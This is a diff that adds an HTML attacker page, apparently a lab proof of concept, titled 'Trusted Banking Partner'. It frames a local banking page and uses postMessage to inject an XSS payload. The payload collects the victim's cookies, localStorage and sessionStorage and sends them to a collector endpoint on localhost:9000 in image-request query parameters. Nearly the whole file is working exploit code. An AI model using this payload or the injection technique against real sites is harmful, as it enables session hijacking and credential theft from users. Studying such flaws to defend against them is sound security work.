@@ -1,0 +1,60 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8" />
+  <title>Trusted Banking Partner</title>
+</head>
+<body>
+  <h1>Banking Services Portal</h1>
+  <p>Secure transaction processing system.</p>
+
+  <iframe id="victimFrame" src="http://127.0.0.1:5500/bank.html"
+          style="width:800px;height:400px;border:1px solid #444;"></iframe>
+
+  <script>
+    const collector = 'http://localhost:9000/collect';
+
+    const xssPayload = `
+      <img src=x onerror="
+        try {
+          var c = encodeURIComponent(document.cookie || '');
+          var ls = encodeURIComponent(JSON.stringify((function(){
+            try {
+              var o={};
+              for(var i=0;i<localStorage.length;i++){ var k=localStorage.key(i); o[k]=localStorage.getItem(k); }
+              return o;
+            } catch(e) { return 'localStorage_err'; }
+          })()));
+          var ss = encodeURIComponent(JSON.stringify((function(){
+            try {
+              var o={};
+              for(var i=0;i<sessionStorage.length;i++){ var k=sessionStorage.key(i); o[k]=sessionStorage.getItem(k); }
+              return o;
+            } catch(e) { return 'sessionStorage_err'; }
+          })()));
+        } catch(e) { var c='err'; var ls='err'; var ss='err'; }
+        var i=new Image();
+        i.src='${collector}?c='+c+'&ls='+ls+'&ss='+ss+'&ref='+encodeURIComponent(location.href);
+      ">
+    `;
+
+    const maliciousMessage = {
+      type: 'TRANSACTION_RESPONSE',
+      action: 'update_status',
+      data: {
+        status: xssPayload
+      }
+    };
+
+    const iframe = document.getElementById('victimFrame');
+    iframe.onload = function() {
+      try {
+        iframe.contentWindow.postMessage(maliciousMessage, '*');
+        console.log('[attacker] sent structured payload on iframe.onload');
+      } catch (e) {
+        console.error('postMessage error', e);
+      }
+    };
+  </script>
+</body>
+</html>
